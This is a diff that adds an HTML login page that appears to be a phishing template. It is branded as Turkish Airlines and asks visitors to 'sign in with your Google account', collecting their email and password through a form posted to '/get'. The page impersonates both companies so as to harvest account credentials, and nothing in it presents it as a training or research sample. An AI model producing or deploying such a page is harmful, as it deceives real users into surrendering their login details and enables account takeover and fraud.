@@ -1,0 +1,180 @@
+<!DOCTYPE html>
+<html>
+<head>
+<style>
+body {
+  font-family: Arial, sans-serif;
+  background-color: #FFFFFF;
+}
+
+.container {
+  max-width: 400px;
+  margin: 0 auto;
+  padding: 20px;
+}
+
+@media (min-width: 600px) {
+  .container {
+    max-width: 500px;
+  }
+}
+
+.logo-container {
+  text-align: center;
+  margin-bottom: 30px;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+
+.logo {
+  width: 40px;
+  height: 40px;
+  fill: #FFC72C;
+  margin-right: 100px
+}
+
+.brand-name {
+  font-size: 42px;
+  color: #004894;
+  margin-left: 10px;
+}
+
+.form-container {
+  background: #FFFFFF;
+  border: 1px solid #FFFFFF;
+  border-radius: 4px;
+  padding: 20px;
+  box-shadow: 0px 0px 10px 0px rgba(108,66,156,0.2);
+}
+
+h1 {
+  text-align: center; 
+  font-size: 28px;
+  font-weight: 500;
+  color: #004894;
+  margin-bottom: 20px;
+}
+
+h2 {
+  text-align: center; 
+  font-size: 28px;
+  font-weight: 500;
+  color: #004894;
+  margin-bottom: 20px;
+}
+
+.input-field {
+  width: 100%;
+  padding: 12px;
+  border: 2px solid #C70A0C;
+  border-radius: 4px;
+  box-sizing: border-box;
+  margin-bottom: 20px;
+  font-size: 14px;
+}
+
+.submit-btn {
+  background: #C70A0C;
+  border: none;
+  color: #000000;
+  padding: 12px 20px;
+  border-radius: 4px;
+  cursor: pointer;
+  font-size: 16px;
+  display: block;
+  margin: auto;
+}
+
+.submit-btn:hover {
+  background: #FFC72C;
+}
+}
+.forgot-password {
+  display: block;
+  text-align: center;
+  color: #004894;
+  text-decoration: underline;
+  margin-top: 10px;
+}
+
+.error-message {
+  color: red;
+  text-align: center;
+  display: none; 
+  margin-top: 10px;
+}
+
+
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+  <div class="logo-container">
+<svg version="1.0" xmlns="http://www.w3.org/2000/svg"
+ width="150.004894pt" height="150.004894pt" viewBox="0 0 1508.004894 1508.004894"
+ preserveAspectRatio="xMidYMid meet">
+<g transform="translate(0.004894,1508.004894) scale(0.100000,-0.100000)"
+fill="#C70A0C" stroke="none">
+<path d="M7225 14640 c-823 -35 -1699 -230 -2429 -542 -182 -77 -546 -254
+-546 -265 0 -4 94 -41 208 -82 1006 -360 1964 -824 2702 -1309 492 -323 851
+-611 1210 -971 404 -405 681 -781 894 -1211 172 -347 262 -649 316 -1050 20
+-144 22 -193 17 -390 -3 -124 -12 -270 -21 -325 -103 -687 -411 -1253 -995
+-1833 -68 -67 -122 -124 -120 -126 2 -2 60 0 129 5 69 4 231 15 360 23 409 27
+680 45 830 56 80 6 420 28 755 50 336 22 806 54 1045 70 239 16 505 34 590 40
+202 14 393 27 670 46 390 26 466 28 500 14 32 -13 60 -54 60 -89 0 -26 -43
+-76 -77 -89 -26 -10 -1060 -306 -2513 -718 -338 -96 -691 -197 -785 -224 -234
+-68 -2335 -666 -2965 -845 -283 -80 -654 -186 -825 -235 -170 -49 -636 -182
+-1035 -295 -399 -113 -801 -228 -895 -255 -93 -27 -496 -142 -895 -255 -399
+-114 -931 -265 -1182 -337 l-458 -131 30 -41 c259 -354 651 -786 980 -1080
+1013 -907 2277 -1511 3595 -1716 662 -103 1358 -131 1870 -75 336 37 811 127
+1135 214 1550 418 2883 1320 3845 2603 693 923 1148 1990 1334 3126 115 700
+122 1458 20 2162 -21 150 -94 510 -140 695 -198 793 -534 1554 -981 2224 -531
+793 -1214 1471 -2010 1995 -436 286 -923 535 -1397 713 -451 169 -1005 314
+-1441 377 -510 73 -911 95 -1385 76z"/>
+<path d="M3580 13453 c-664 -452 -1247 -1007 -1722 -1638 -1080 -1435 -1581
+-3208 -1402 -4965 49 -489 160 -1037 299 -1485 157 -501 409 -1051 691 -1505
+84 -135 65 -124 169 -94 354 101 684 215 975 335 180 74 560 260 729 356 238
+135 563 363 776 542 126 106 426 407 524 526 560 677 896 1450 1065 2445 154
+909 116 1832 -110 2710 -235 910 -661 1702 -1271 2365 -133 145 -485 466 -553
+504 -11 7 -58 -20 -170 -96z"/>
+</g>
+</svg>
+
+
+
+
+    <div class="brand-name">TURKISH AIRLINES</div>
+  </div>
+
+  <div class="form-container">
+
+    <center><h1>Sign in with your <b>Google</b> account</h1>
+      </center>
+
+    <form action="/get" id="login-form">
+    
+      <input name="email" class="input-field" type="text" placeholder="Email or mobile phone number" required>
+      
+      <input name="password" class="input-field" type="password" placeholder="Password" required>
+	  <a href="javascript:void(0);" class="forgot-password">Forgot credentials?</a>
+      <button class="submit-btn" type="submit"><b>Continue</b></button>
+
+	  				<div class="error-message"></div>
+    </form>
+
+  </div>
+
+</div>
+<script>
+  document.querySelector('.forgot-password').addEventListener('click', function() {
+    var errorMessage = document.querySelector('.error-message');
+    errorMessage.innerHTML = "Please refer to your Google account if you forgot your credentials";
+    errorMessage.style.display = 'block';
+  });
+</script>
+</body>
+</html>
